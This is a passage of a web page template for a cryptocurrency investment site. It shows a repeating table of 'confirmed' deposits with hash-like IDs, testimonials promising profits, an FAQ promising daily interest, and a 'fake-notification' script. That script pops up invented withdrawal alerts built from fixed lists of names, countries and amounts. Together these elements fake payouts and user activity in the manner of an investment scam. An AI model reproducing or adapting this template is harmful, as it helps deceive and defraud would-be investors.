    				  <td class="table-font">7ac003e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
    				</tr>
    			   
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$16,000.00</td>
    				  <td class="table-font">0067ab9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$14,000.00</td>
    				  <td class="table-font">7a5ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d</td>
    				</tr>
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$1,000.00</td>
    				  <td class="table-font">ab5cb66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661</td>
    				</tr>
    				
    				
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$21,000.00</td>
    				  <td class="table-font">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$6,000.00</td>
    				  <td class="table-font">797ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d</td>
    				</tr>
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$9,000.00</td>
    				  <td class="table-font">f0b66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661</td>
    				</tr>				
    				<tr>
    				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
    				  <td class="table-font">$23,000.00</td>
    				  <td class="table-font">2083e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
    				</tr>
    								<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$10,000.00</td>
    				  <td class="table-font">3a17c5984af22cd7a443f14457841b3b19a51ea75a30e18bc6a82e4f8732dbca</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$24,000.00</td>
    				  <td class="table-font">f007e92cc9f82ba9c8c40c481eec7315fa9abcd85e7249a6cb57e38a2cf22d3e</td>
    				</tr>
    				
    				<tr>
    				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
    				  <td class="table-font">$3,000.00</td>
    				  <td class="table-font">ab6c83e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
    				</tr>
    				
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$4,000.00</td>
    				  <td class="table-font">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$500.00</td>
    				  <td class="table-font">00db85ef40da34f3ea76aa60f0b2053eec2d90121e450791c18d8edbfedde6f1</td>
    				</tr>
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$240,000.00</td>
    				  <td class="table-font">b21a418a44ed8b56118facefe7aa8d26541dff811b8a8ca65cfa1346d62c5c48</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$17,000.00</td>
    				  <td class="table-font">1e652d2899a1d058a20041a9faaeb5dc009101ca412ff09c387e6b281bd1db8b</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$51,000.00</td>
    				  <td class="table-font">6a49e66a66f75e72e6bd383ac798792af204a6693708912ad0d48e363a2ab7a7</td>
    				</tr>
    			   <tr>
    				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
    				  <td class="table-font">$8,000.00</td>
    				  <td class="table-font">7ac003e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
    				</tr>
    			   
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$16,000.00</td>
    				  <td class="table-font">0067ab9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$14,000.00</td>
    				  <td class="table-font">7a5ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d</td>
    				</tr>
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$1,000.00</td>
    				  <td class="table-font">ab5cb66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661</td>
    				</tr>
    				
    				
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$21,000.00</td>
    				  <td class="table-font">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$6,000.00</td>
    				  <td class="table-font">797ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d</td>
    				</tr>
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$9,000.00</td>
    				  <td class="table-font">f0b66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661</td>
    				</tr>				
    				<tr>
    				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
    				  <td class="table-font">$23,000.00</td>
    				  <td class="table-font">2083e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
    				</tr>
    
    			  </table>
    			</div>
    			
                <div class="mobileapp-section p-tb black-bg white-sec">
                    <div class="container">
                        <div class="row align-items-center flex-row-reverse">
                            <div class="col-lg-5">
                                <div class="iphone-img">
                                    <img src="{{asset('home/images/mercury-iphone-img.png') }}" alt="">
                                </div>
                            </div>
                            <div class="col-lg-7">
                                <h2 class="section-heading">Mobile App Coming Soon!</h2>
                                <p>{{$settings->site_name}} is a top tier bitcoin investment platform accessible to everyone. {{$settings->site_name}} is a modular Bitcoin full-node microservices API server architecture and utilities toolkit are built to be scalable</p>
                                <p>{{$settings->site_name}} is run by self-proclaimed Experts and Bitcoin Maximalists and it shows as one of the top bitcoin investment sites with focus on privacy, security, and enabling users to maintain full custody of their Bitcoin.</p>
                                <div class="button-wrapper">
                                    <a href="#" class="apple-btn">
                                        <img src="{{asset('home/images/app-store-btn.png') }}" alt="">
                                    </a>
                                    <a href="#" class="google-btn">
                                        <img src="{{ asset ('home/images/google-play-btn.png') }}" alt="">
                                    </a>
                                </div>
                            </div>
                            
                        </div>
                    </div>
                </div>
                <!-- Team sec start-->
                <div class="team-section p-tb light-gray-bg mercury-layout" id="team">
                    <div class="container">
                        <div class="text-center"><h2 class="section-heading">Testimonials</h2></div>
                        <div class="row">
                            <div class="col-md-6 col-lg-3">
                                <div class="team-box">
                                    <div class="team-img">
                                        <img src="{{asset('home/images/team-9.jpg')}}" alt="">
                                        
                                    </div>
                                    <div class="text">
                                        <h4>Lewis K</h4>
                                        <span>This platform is a good initiative, thank you very much i got profits.</span>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 col-lg-3">
                                <div class="team-box">
                                    <div class="team-img">
                                        <img src="{{ asset ('home/images/team-10.jpg') }}" alt="">
                                        
                                    </div>
                                    <div class="text">
                                        <h4>Jenny Williams</h4>
                                        <span>The site is easy to use and also nice. I would love if they can give a top up account option. Thank a lot.</span>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 col-lg-3">
                                <div class="team-box">
                                    <div class="team-img">
                                        <img src="{{ asset ('home/images/team-12.jpg') }}" alt="">
                                    </div>
                                    <div class="text">
                                        <h4>Saru M</h4>
                                        <span>Quite easy to use, straightforward the user interface fairly easy to navigate, deposits and withdrawals don't take up 20 minutes on weekdays...</span>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 col-lg-3">
                                <div class="team-box">
                                    <div class="team-img">
                                        <img src="{{ asset ('home/images/team-11.jpg') }}" alt="">
                                    </div>
                                    <div class="text">
                                        <h4>Herv N</h4>
                                        <span>Awesome, It's commendable. I am new to bitcoin investment but this has given me high returns. Well done.</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Team sec end-->
                 <!-- FAQ Section start-->
                <div class="faq-section p-tb white-bg diamond-layout" id="faq">
                    <div class="container">
                        <div class="text-center"><h2 class="section-heading">Frequently Asked Questions</h2></div>
                        <div class="row">
                            <div class="col-sm-12">
                                <!--Accordion wrapper-->
                                <div class="accordion md-accordion style-2" id="accordionEx" role="tablist" aria-multiselectable="true">
                                    <!-- Accordion card -->
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading1">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse1" aria-expanded="false" aria-controls="collapse1">
                                                <h5 class="mb-0">
                                                    What is {{$settings->site_name}}? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse1" class="collapse" role="tabpanel" aria-labelledby="heading1" data-parent="#accordionEx">
                                            <div class="card-body">
                                               {{$settings->site_name}} is a cryptocurrency trading platform that specializes in strategic investments across various crypto assets, including early-stage projects, seed and presale rounds, low-cap and high-cap utility coins, and meme coins.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading2">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse2" aria-expanded="false" aria-controls="collapse2">
                                                <h5 class="mb-0">
                                                    How do I register on {{$settings->site_name}}? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse2" class="collapse" role="tabpanel" aria-labelledby="heading2" data-parent="#accordionEx">
                                            <div class="card-body">
                                               To register, <a href="register"> visit our registration page</a>, fill out the required information, and verify your account. The process is quick and straightforward.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading3">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse3" aria-expanded="false" aria-controls="collapse3">
                                                <h5 class="mb-0">
                                                    Is there a KYC process involved? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse3" class="collapse" role="tabpanel" aria-labelledby="heading3" data-parent="#accordionEx">
                                            <div class="card-body">
                                               KYC  are regulation needed for verification and to ensure no user is automating the process of investment there fore whenever the arises you may be required to submit perosnal information to verify you identifity only when needed.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading4">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse4" aria-expanded="false" aria-controls="collapse4">
                                                <h5 class="mb-0">
                                                    How can I deposit funds into my {{$settings->site_name}} wallet? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse4" class="collapse" role="tabpanel" aria-labelledby="heading4" data-parent="#accordionEx">
                                            <div class="card-body">
                                                You can deposit funds using various methods such as bank transfer, credit/debit card, or cryptocurrency transfer. 
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading5">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse5" aria-expanded="false" aria-controls="collapse5">
                                                <h5 class="mb-0">
                                                    What investment plans are available? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse5" class="collapse" role="tabpanel" aria-labelledby="heading5" data-parent="#accordionEx">
                                            <div class="card-body">
                                               We offer five investment plans, each with specific minimum and maximum investment amounts and interest rates. Details of each plan are available on our <a href="plans">investment plans page</a>.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading6">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse6" aria-expanded="false" aria-controls="collapse6">
                                                <h5 class="mb-0">
                                                    How do I earn interest on my investments? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse6" class="collapse" role="tabpanel" aria-labelledby="heading6" data-parent="#accordionEx">
                                            <div class="card-body">
                                               Once you choose and invest in a plan, you will start earning daily interest, which is automatically added to your {{$settings->site_name}} wallet.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading7">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse7" aria-expanded="false" aria-controls="collapse7">
                                                <h5 class="mb-0">
                                                    Can I withdraw my earnings anytime? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse7" class="collapse" role="tabpanel" aria-labelledby="heading7" data-parent="#accordionEx">
                                            <div class="card-body">
                                               Yes, you can withdraw the daily interest earnings at any time. However, the initial capital is locked until the completion of the investment plan’s duration.
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading8">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse8" aria-expanded="false" aria-controls="collapse8">
                                                <h5 class="mb-0">
                                                    What happens at the end of my investment plan's duration? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse8" class="collapse" role="tabpanel" aria-labelledby="heading8" data-parent="#accordionEx">
                                            <div class="card-body">
                                               Upon completion of your investment plan’s duration, your initial capital will be released back to your {{$settings->site_name}} wallet, ready for withdrawal or reinvestment.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading9">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collaps9" aria-expanded="false" aria-controls="collaps9">
                                                <h5 class="mb-0">
                                                    Is my investment safe with {{$settings->site_name}}? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collaps9" class="collapse" role="tabpanel" aria-labelledby="heading9" data-parent="#accordionEx">
                                            <div class="card-body">
                                               We prioritize the security of your investments through careful selection of investment opportunities and rigorous due diligence. However, as with any investment, there are inherent risks in the cryptocurrency market.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading10">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse10" aria-expanded="false" aria-controls="collapse10">
                                                <h5 class="mb-0">
                                                    How do I learn more about cryptocurrency and blockchain? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse10" class="collapse" role="tabpanel" aria-labelledby="heading10" data-parent="#accordionEx">
                                            <div class="card-body">
                                               We provide regular educational newsletters that cover a wide range of topics, from basic blockchain concepts to advanced investment strategies. Our resources are designed to help you become a confident and informed investor.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading11">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse11" aria-expanded="false" aria-controls="collapse11">
                                                <h5 class="mb-0">
                                                    What is the Executive Investment Plan? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse11" class="collapse" role="tabpanel" aria-labelledby="heading11" data-parent="#accordionEx">
                                            <div class="card-body">
                                               The Executive Investment Plan includes exclusive benefits such as an insider newsletter with weekly analyses of crypto assets and upcoming projects, valued at $500/month. It offers deeper insights into our investment strategies and market outlook.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card">
                                        <!-- Card header -->
                                        <div class="card-header" role="tab" id="heading12">
                                            <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse12" aria-expanded="false" aria-controls="collapse12">
                                                <h5 class="mb-0">
                                                    How can I contact {{$settings->site_name}} for support? <i class="fas fa-caret-down rotate-icon"></i>
                                                </h5>
                                            </a>
                                        </div>
                                        <!-- Card body -->
                                        <div id="collapse12" class="collapse" role="tabpanel" aria-labelledby="heading12" data-parent="#accordionEx">
                                            <div class="card-body">
                                               You can reach out to our support team via email at <a href="mailto:{{$settings->contact_email}}">{{$settings->contact_email}}</a> or through our live chat feature on the website. We are here to assist you with any questions or issues.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <!-- Accordion wrapper -->
                            </div>
                        </div>
                    </div>
                </div>
                    

                <!-- FAQ Section end--> 
                <!-- Brand logo slider -->
                <div class="brand-logo-slider c-l p-tb white-sec">
                    <div class="container">
                        <div class="text-center"><h2 class="section-heading">Our Partners</h2></div>
                        <div class="brand-logos owl-carousel">
                            <div class="item"><img src="{{ asset ('home/images/trustwallet.png')}}" alt="Trust Wallet" /></div>
                            <div class="item"><img src="{{ asset ('home/images/luno.png')}}" alt="Luno" /></div>
                            <div class="item"><img src="{{ asset ('home/images/paxful.png')}}" alt="Paxful" /></div>
                            <div class="item"><img src="{{ asset ('home/images/binance.png')}}" alt="Binance" /></div>
                            <div class="item"><img src="{{ asset ('home/images/coinmama.png')}}" alt="Coin Mama" /></div>
                        </div>
                    </div>
                </div>
                <!-- Brand logo end -->
            </div>
            <!-- Content Section End -->   
            <div class="clear"></div>
            <!--footer Start-->   
            <footer class="footer-3">
                <div class="container">
                    <div class="row">
                        <div class="col-md-4 footer-box-1">
                            <div class="footer-logo">
                                <a href="#" title=""><img src="{{ asset ('home/logo-3.png') }}" width="120" alt="Cp Silver"></a>
                            </div>
                            <p>Trading binary options is the latest way to trade global markets. It is a form of trading that allows you to earn maximum profit with minimal investment of time and money. Binary options have opened up financial markets to people around the entire world.</p>
                        </div>
                        <div class="col-md-3 footer-box-2">
                            <ul class="footer-menu onepage">
    							 <li><a href="#top">Home</a></li>
                                 <li><a href="#about">About Us</a></li>
                                 <!--<li><a href="#token">Equities</a></li>-->
                                 <li><a href="#team">Testimonials</a></li>
                                 <li><a href="#">Contact Us</a></li>
                            </ul>
                        </div>
                        <div class="col-md-5 footer-box-3">
                            <h4>Newsletter</h4>
                            <p>Keep up to date with our progress. Subscribe for e-mail updates.</p>
                            <div class="newsletter">
                                <form>
                                    <div class="input"><input type="email" name="Email" placeholder="Your email address"></div>
                                    <div class="submit"><input class="btn" type="submit" name="subscribe" value="subscribe"></div>
                                </form>
                            </div>
                            <div class="socials">
                                <ul>
                                    <li><a href="https://facebook.com/"><i class="fab fa-facebook-f"></i></a></li>
                                    <li><a href="https://twitter.com/"><i class="fab fa-twitter"></i></a></li>
                                    <li><a href="https://plus.google.com/"><i class="fab fa-google-plus-g"></i></a></li>
                                    <li><a href="https://www.youtube.com/"><i class="fab fa-youtube"></i></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
            <!--footer end--> 
        </div>
        <!--Main Wrapper End-->
    </div>
    
    <!--start alert js-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-sweetalert/1.0.1/sweetalert.min.js"></script>
    <script type="text/javascript" src="{{ asset ('home/alert/js/jquery.fake-notification.min.js')}}"></script>
	<script>
        $(document).ready(function() {
                $('#notification-1').Notification({
                    // Notification varibles
                    Varible1: ["Dirk", "Johnny", "Watkin ", "Alejandro",  "Vina",  "Tony",   "Ahmed","Jackson",  "Noah", "Aiden",  "Darren", "Isabella", "Aria", "John", "Greyson", "Peter", "Mohammed", "William",
                    "Lucas", "Amelia", "Mason", "Mathew", "Richard", "Chris", "Mia", "Oliver"],
                    Varible2: ["USA","UAE","ITALY", "FLORIDA",  "MEXICO",  "INDIA",  "CHINA",  "CAMBODIA",  "UNITED KINGDOM",  "GERMANY", "AUSTRALIA",  "BANGLADESH", "SWEDEN", "PAKISTAN", "MALDIVES", "SEYCHELLES", 
                    "BOLIVIA",
                     "SOUTH AFRICA", "ZAMBIA", "ZIMBABWE", "LEBANESE", "SAUDI ARABIA", "CHILE", "PUERTO RICO"],
                    
                    Amount: [8000,25000,5550,31660,40440,7986,9533],                    
                    Content: '[Varible1] from [Varible2] has withdrawn <b>$[Amount]</b>',
                    // Timer
                    Show: ['stable', 5, 10],
                    Close: 5,
                    Time: [0, 23],
                    // Notification style 
                    LocationTop: [true, '30%'],
                    LocationBottom:[false, '10%'],
                    LocationRight: [false, '10%'],                      
                    LocationLeft:[true, '10px'],
                    Background: '#fff',
                    BorderRadius: 5,
                    BorderWidth: 1,
                    BorderColor: '#ffc552',
                    TextColor: '#2962FF',
                    IconColor: '#2962FF',
                    // Notification Animated   
                    AnimationEffectOpen: 'slideInUp',
                    AnimationEffectClose: 'slideOutDown',
                    // Number of notifications
                    Number: 40,
                    // Notification link
                    Link: [false, '\', '_blank']
                    
                });         
            });         
      </script>
        
		
    <!--/end alert js-->


	<style>
		@-webkit-keyframes cptCircle {
		  0% {
			-webkit-transform: rotate(0) scale(0.5) skew(1deg);
			transform: rotate(0) scale(0.5) skew(1deg);
			opacity: 0.01;
		  }
		  30% {
			-webkit-transform: rotate(0) scale(0.7) skew(1deg);
			transform: rotate(0) scale(0.7) skew(1deg);
			opacity: 0.5;
		  }
		  100% {
			-webkit-transform: rotate(0) scale(1) skew(1deg);
			transform: rotate(0) scale(1) skew(1deg);
			opacity: 0.01;
		  }
		}

		@keyframes cptCircle {
		  0% {
			-webkit-transform: rotate(0) scale(0.5) skew(1deg);
			transform: rotate(0) scale(0.5) skew(1deg);
			opacity: 0.01;
		  }
		  30% {
			-webkit-transform: rotate(0) scale(0.7) skew(1deg);
			transform: rotate(0) scale(0.7) skew(1deg);
			opacity: 0.5;
		  }
		  100% {
			-webkit-transform: rotate(0) scale(1) skew(1deg);
			transform: rotate(0) scale(1) skew(1deg);
			opacity: 0.01;
		  }
		}

		@-webkit-keyframes cptCircleFill {
		  0% {
			-webkit-transform: rotate(0) scale(0.6) skew(1deg);
			transform: rotate(0) scale(0.6) skew(1deg);
			opacity: 0;
		  }
		  50% {
			webkit-transform: rotate(0) scale(1) skew(1deg);
			transform: rotate(0) scale(1) skew(1deg);
			opacity: 0.2;
		  }
		  100% {
			-webkit-transform: rotate(0) scale(0.6) skew(1deg);
			transform: rotate(0) scale(0.6) skew(1deg);
			opacity: 0.2;
		  }
		}

		@keyframes cptCircleFill {
		  0% {
			-webkit-transform: rotate(0) scale(0.6) skew(1deg);
			transform: rotate(0) scale(0.6) skew(1deg);
			opacity: 0;
		  }
		  50% {
			-webkit-transform: rotate(0) scale(1) skew(1deg);
			transform: rotate(0) scale(1) skew(1deg);
			opacity: 0.2;
		  }
		  100% {
			-webkit-transform: rotate(0) scale(0.6) skew(1deg);
			transform: rotate(0) scale(0.6) skew(1deg);
			opacity: 0.2;
		  }
		}

		#capitol-callback {
		  font-family: Arial;
		  position: fixed;
		  width: 72px;
		  height: 72px;
		  bottom: 60px;
		  top: auto;
		  right: auto;
		  left: 40px;
		  z-index: 1;
		}

		.cpt-circle,
		.cpt-circle-fill {
		  position: absolute;
		  border-radius: 100%;
		  -webkit-transition: all 0.5s;
		  transition: all 0.5s;
		  -moz-box-sizing: border-box;
		  box-sizing: border-box;
		  opacity: 0;
		  -webkit-animation-delay: 2s;
		  animation-delay: 2s;
		}

		.cpt-circle {
		  width: 250%;
		  height: 250%;
		  background-color: transparent;
		  border: 2px solid #189d0e;
		  -webkit-animation: cptCircle 2.2s infinite ease-in-out;
		  animation: cptCircle 2.2s infinite ease-in-out;
		  -webkit-transform-origin: 50% 50%;
		  -ms-transform-origin: 50% 50%;
		  transform-origin: 50% 50%;
		  left: -71%;
		  top: -75%;
		}

		.cpt-circle-fill {
		  width: 155%;
		  height: 155%;
		  background-color: #189d0e;
		  border: 2px solid transparent;
		  -webkit-animation: cptCircleFill 2.3s infinite ease-in-out;
		  animation: cptCircleFill 2.3s infinite ease-in-out;
		  box-shadow: 0 0 2px 0 #189d0e !important;
		  left: -23.5%;
		  top: -27.5%;
		}

		.main-button {
		  position: relative;
		  right: 1px;
		  top: 1px;
		  float: right;
		  width: 64px;
		  height: 64px;
		  background: center center no-repeat #189d0e;
		  box-shadow: 0 3px 5px 1px rgba(0, 0, 0, 0.2);
		  background-size: 30px;
		  border-radius: 100%;
		  cursor: pointer;
		  font-size: 16px;
		  color: #fff;
		  text-align: center;
		  line-height: 58px;
		}

		.main-button i {
		  opacity: 0;
		  visibility: hidden;
		  -webkit-transition: all 0.6s cubic-bezier(0.55, 0, 0.1, 1);
		  transition: all 0.6s cubic-bezier(0.55, 0, 0.1, 1);
		  -webkit-transform: perspective(400px) rotateY(-180deg) scale(0.4)
			translate3d(-50%, -50%, 0);
		  transform: perspective(400px) rotateY(-180deg) scale(0.4)
			translate3d(-50%, -50%, 0);
		  z-index: 1;
		  width: 45%;
		  height: 45%;
		  font-size: 16px;
		  
		}

		.main-button img {
		  vertical-align: middle;
		}

	</style>
	  
	<div id="capitol-callback">
	  <div class="cpt-circle"></div>
	  <div class="cpt-circle-fill"></div>
	  <a href="https://api.whatsapp.com/send?phone={{$settings->whatsapp}}&text= Hello {{$settings->site_name}} " id="WhatsAppBtnDesktop" target="_blank" class="main-button" lang="en">
		<img src="https://nhtagent.com/nht-upload/assets/javascripts/WhatsApp/WhatsApp.png" width="100%">
	  </a>
	</div>

    <script> 
    	var $el = $(".table-style");
    	function anim() {
    	  var st = $el.scrollTop();
    	  var sb = $el.prop("scrollHeight")-$el.innerHeight();
    	  $el.animate({scrollTop: st<sb/2 ? sb : 0}, 48000, anim);
    	}
    	function stop(){
    	  $el.stop();
    	}
    	anim();
    	$el.hover(stop, anim);
	</script>

 
    <script src="//code.tidio.co/6ggc9gummgdvuispgmnnddwoqk0bztz9.js" async></script>
    <script src="{{ asset ('home/js/jquery.min.js')}}"></script>
    <script src="{{ asset ('home/js/bootstrap.min.js')}}"></script>
    <script src="{{ asset ('home/js/onpagescroll.js')}}"></script>
    <script src="{{ asset ('home/js/wow.min.js')}}"></script>
    <script src="{{ asset ('home/js/jquery.countdown.js')}}"></script>
    <script src="{{ asset ('home/js/owl.carousel.js')}}"></script>
    
    
    <script src="{{ asset ('home/js/Chart.js')}} "></script>
    <script src="{{ asset ('home/js/chart-function.js')}} "></script>
    <script src="{{ asset ('home/js/script.js')}} "></script>
    <script src="{{ asset ('home/js/particles.js')}} "></script>
    <script src="{{ asset ('home/js/gold-app.js')}} "></script>
    
    <script type="text/javascript">
        jQuery(document).ready(function(){
            setTimeout(function(){
                jQuery('.diamond-animation').addClass('done');
            }, 6000);
            setTimeout(function(){
                jQuery('.diamond-animation .main').addClass('active');
            }, 1000);
            setTimeout(function(){
                jQuery('.inside-bitcoin').addClass('active');
            }, 3000);
            setTimeout(function(){
                jQuery('.inside-bitcoin').addClass('spincoin');
            }, 5000);
            setTimeout(function(){
                jQuery('.diamond-animation .lines').addClass('active');
            }, 6000);
            setTimeout(function(){
                jQuery('.diamond-animation .top-coin').addClass('active');
            }, 3000);
             setTimeout(function(){
                jQuery('.diamond-animation .outer-Orbit').addClass('active');
            }, 5000);
        });
    </script>
    
     <script type="text/javascript">
        function isScrolledIntoView(elem) {
            var docViewTop = jQuery(window).scrollTop();
            var docViewBottom = docViewTop + jQuery(window).height();
            var elemTop = jQuery(elem).offset().top;
            var elemBottom = elemTop + jQuery(elem).height();
            return ((elemBottom <= docViewBottom) && (elemTop >= docViewTop));
        }
        jQuery(window).scroll(function () {
            jQuery('.about-mercury-animation').each(function () {
                if (isScrolledIntoView(this) === true) {
                    jQuery(this).addClass('visible');
                }
            });
            jQuery('.token-pricing-section').each(function () {
                if (isScrolledIntoView(this) === true) {
                    jQuery(this).addClass('visible');
                }
            });
        });
        jQuery(document).ready(function () {
            jQuery('.allocation-list-point li:first-child').addClass('hover');
            jQuery('.allocation-list-point li .point').hover(function(){
                jQuery('.allocation-list-point li').removeClass('hover');
                jQuery(this).parent('li').addClass('hover');
            });
        });
    </script>
	
	<script>
		$(document).ready(function() {
            $('#notification-1').Notification({
                // Notification varibles
                Varible1: ["someone", "someone", "Aiden",  "Darren", "Isabella", "Aria", "John", "Greyson", "Peter", "Mohammed", "William",
